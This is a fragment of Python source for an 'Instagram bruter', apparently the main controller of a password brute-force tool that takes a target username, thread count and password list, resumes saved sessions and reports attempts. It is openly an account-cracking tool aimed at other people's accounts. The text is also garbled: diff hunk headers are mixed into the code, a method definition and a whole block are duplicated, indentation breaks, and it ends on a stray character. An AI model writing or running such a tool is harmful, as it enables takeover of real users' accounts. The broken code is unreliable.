# Date: 03/09/2020
# Author: Kingslayer
# Description: Instagram bruter
from sys import exit
from os.path import exists
import Bruter
import Session
import Display
from lib.const import credentials, modes

#-20,14 +19,10 @@ def __init__(self, username, threads, passlist_path)
self.username = username
self.display = Display()
self.passlist_path = passlist_path
self.session = Session(username, passlist_path)
def session_exists(self):
        return self.session.exists

def create_bruter(self):
        self.bruter = Bruter(self.username, self.threads,
                             self.passlist_path, self.resume)
#self.passlist_pathdef get_user_resp(self):
        return self.display.prompt('Would you like to resume the attack? [y/n]: ')
#@@ -39,29 +34,33 @@ def write_to_file(self, password):
f.write(data)

def start(self):
 def start(self):
        if self.session_exists() and self.is_alive:
            resp = None

        self.create_bruter()

        while self.is_alive and not self.bruter.password_manager.session:
            pass

        if not self.is_alive:
            return

        if self.bruter.password_manager.session.exists:
            try:
                resp = self.get_user_resp()
            except:
                self.is_alive = False

            if resp and self.is_alive:
                if resp.strip().lower() == 'y':
                    self.resume = True
                    self.bruter.password_manager.resume = True

        if self.is_alive:
            self.create_bruter()

            try:
                self.bruter.start()
            except KeyboardInterrupt:
                self.bruter.stop()
                self.bruter.display.shutdown(self.bruter.last_password,
                                             self.bruter.password_manager.attempts, len(self.bruter.browsers))
            finally:
                self.stop()
        try:
            self.bruter.start()
        except KeyboardInterrupt:
            self.bruter.stop()
            self.bruter.display.shutdown(self.bruter.last_password,
                                         self.bruter.password_manager.attempts, len(self.bruter.browsers))
        finally:
            self.stop()


def stop(self):
        if self.is_alive:n